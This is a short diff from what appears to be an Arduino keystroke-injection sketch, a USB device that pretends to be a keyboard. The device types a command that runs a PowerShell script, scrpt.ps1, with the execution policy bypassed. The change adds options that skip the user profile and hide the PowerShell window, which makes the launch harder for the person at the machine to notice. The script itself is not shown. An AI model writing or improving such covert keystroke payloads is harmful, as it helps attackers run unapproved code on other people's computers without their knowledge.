@@ -105,7 +105,7 @@ void loop() {
   delay(5);
   printKey(KEY_ENTER);
   delay(1000);
-  Keyboard.print("powershell.exe -ExecutionPolicy Bypass -File scrpt.ps1");
+  Keyboard.print("powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File scrpt.ps1");
   printKey(KEY_ENTER);
 
 
